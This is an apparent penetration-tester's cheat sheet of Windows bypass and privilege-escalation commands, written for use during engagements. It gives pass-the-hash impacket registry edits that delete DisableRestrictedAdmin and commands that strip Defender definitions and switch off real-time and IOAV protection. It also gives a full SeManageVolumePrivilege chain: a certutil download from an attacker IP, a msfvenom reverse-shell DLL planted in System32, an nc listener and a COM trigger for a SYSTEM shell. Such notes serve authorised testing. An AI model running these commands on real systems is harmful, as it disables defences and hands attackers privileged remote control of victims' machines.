# Bypasses and Tradecraft

Defender/AppLocker/UAC-oriented notes and a small number of host tradecraft snippets that are operationally useful but not a full privesc page by themselves.
Keep changes deliberate and reversible during an engagement.

## impacket reg query example

```
impacket-reg <domain>/<username>@<ip> -hashes ':<nthath>' query -keyName 'HKLM\System\CurrentControlSet\Control\Lsa'
```

## impacket reg del example

```
impacket-reg <domain>/<username>@<ip> -hashes ':<nthath>' delete -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin'
```

## Clean Defender rules

```
"c:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Disable Defender realtime monitoring

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

## Disable Defender IOAV Protection

```
Set-MpPreference -DisableIOAVProtection $true
```

## SeManageVolumePrivilege

```
certutil -urlcache -split -f http://192.168.45.214/SeManageVolumeExploit.exe
\SeManageVolumeExploit.exe

msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.214 LPORT=443 -f dll -o Printconfig.dll
certutil -split -urlcache -split -f http://192.168.45.214/payload/Printconfig.dll
copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\
# press Yes

nc -lvnp 443 # setup listener on KALI

# on target - run trigger
powershell
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
$object = [Activator]::CreateInstance($type)
# should get nt authority\system shell
```

There is another trigger we can use (Report.wer and WerTrigger.exe in /bin in repo):

[GitHub - sailay1996/WerTrigger: Weaponizing for privileged file writes bugs with windows problem reporting](https://github.com/sailay1996/WerTrigger/tree/master)
